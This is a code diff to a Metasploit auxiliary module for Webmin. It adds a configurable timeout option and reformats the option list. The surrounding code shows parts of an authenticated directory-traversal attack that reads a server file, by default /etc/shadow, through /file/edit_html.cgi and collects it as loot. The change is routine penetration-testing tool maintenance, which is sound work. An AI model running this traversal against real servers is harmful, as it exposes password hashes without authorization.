@@ -44,12 +44,17 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(10000),
-        OptBool.new('SSL', [true, 'Use SSL', true]),
-        OptString.new('USERNAME',  [true, 'Webmin Username']),
-        OptString.new('PASSWORD',  [true, 'Webmin Password']),
-        OptInt.new('DEPTH', [true, 'Traversal depth', 4]),
-        OptString.new('RPATH', [ true, "The file to download", "/etc/shadow" ])
+        OptBool.new('SSL', [ true, 'Use SSL', true ]),
+        OptString.new('USERNAME', [ true, 'Webmin Username' ]),
+        OptString.new('PASSWORD', [ true, 'Webmin Password' ]),
+        OptInt.new('DEPTH', [ true, 'Traversal depth', 4 ]),
+        OptString.new('RPATH', [ true, "The file to download", "/etc/shadow" ]),
+        OptInt.new('TIMEOUT', [ true, "The timeout in seconds waiting for the server response", 25 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT']
   end
 
   def run
@@ -66,7 +71,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'     => "/session_login.cgi",
         'cookie'  => "testing=1",
         'data'    => data
-      }, 25)
+      }, timeout)
 
     if res and res.code == 302 and res.get_cookies =~ /sid/
       session = res.get_cookies.scan(/sid\=(\w+)\;*/).flatten[0] || ''
@@ -92,7 +97,7 @@ class Metasploit3 < Msf::Auxiliary
         'method'  => 'GET',
         'uri'     => "/file/edit_html.cgi?#{data}",
         'cookie'  => "sid=#{session}"
-      }, 25)
+      }, timeout)
 
     if (res and res.code == 200 and res.body =~ /#{traversal}/ and res.body =~ /name=body>(.*)<\/textarea>/m)
       loot = $1
